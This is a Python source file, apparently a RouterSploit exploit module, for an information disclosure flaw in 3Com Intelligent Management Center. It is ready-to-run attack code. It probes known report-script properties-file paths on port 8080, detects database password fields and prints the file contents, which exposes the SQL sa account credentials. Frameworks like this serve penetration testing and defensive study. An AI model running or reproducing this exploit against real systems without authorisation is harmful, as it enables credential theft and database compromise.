from routersploit import (
    exploits,
    print_status,
    print_error,
    print_info,
    print_success,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for 3Com Intelligent Management Center Information Disclosure vulnerability.
    If the target is vulnerable it allows to read credentials for SQL sa account.
    """
    __info__ = {
        'name': '3Com IMC Info Disclosure',
        'description': 'Exploits 3Com Intelligent Management Center information disclosure vulnerability that allows to fetch credentials for SQL sa account',
        'authors': [
            'Richard Brain',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/12680/',
        ],
        'devices': [
            '3Com Intelligent Management Center',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(8080, 'Target port')  # default port

    resources = ["/imc/reportscript/sqlserver/deploypara.properties",
                 "/rpt/reportscript/sqlserver/deploypara.properties",
                 "/imc/reportscript/oracle/deploypara.properties"]

    valid = None

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            url = "{}:{}{}".format(self.target, self.port, self.valid)

            print_status("Sending request to download sensitive information")
            response = http_request(method="GET", url=url)
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_status("Reading {}".format(self.valid))
                print_info(response.text)
            else:
                print_error("Exploit failed - could not retrieve response")

        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        for resource in self.resources:
            url = "{}:{}{}".format(self.target, self.port, resource)

            response = http_request(method="GET", url=url)
            if response is None:
                continue

            if any(map(lambda x: x in response.text, ["report.db.server.name", "report.db.server.sa.pass", "report.db.server.user.pass"])):
                self.valid = resource
                return True  # target is vulnerable

        return False  # target not vulnerable
